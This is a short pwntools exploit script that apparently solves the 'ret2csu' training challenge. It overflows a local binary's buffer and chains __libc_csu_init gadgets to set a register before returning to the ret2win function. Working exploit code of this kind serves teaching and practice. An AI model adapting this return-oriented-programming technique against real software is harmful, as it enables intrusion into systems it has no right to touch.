from pwn import *

TARGET = "./ret2csu"
context.log_level = "debug"


def main():
  target_elf = ELF(TARGET)
  target_io = process(TARGET)

  csu_gadgets_0 = p64(0x40089a)
  csu_gadgets_1 = p64(0x400880)
  ret2win = p64(target_elf.symbols["ret2win"])
  init_ptr = p64(0x400e38)

  payload = b"0" * 0x28
  payload += csu_gadgets_0
  payload += p64(0x0)
  payload += p64(0x1)
  payload += init_ptr
  payload += p64(0xf)
  payload += p64(0xf)
  payload += p64(0xdeadcafebabebeef)
  payload += csu_gadgets_1
  payload += p64(0xf)
  payload += p64(0xf)
  payload += p64(0xf)
  payload += p64(0xf)
  payload += p64(0xf)
  payload += p64(0xf)
  payload += p64(0xf)
  payload += ret2win

  target_io.sendline(payload)
  target_io.interactive()


if __name__ == "__main__":
  main()
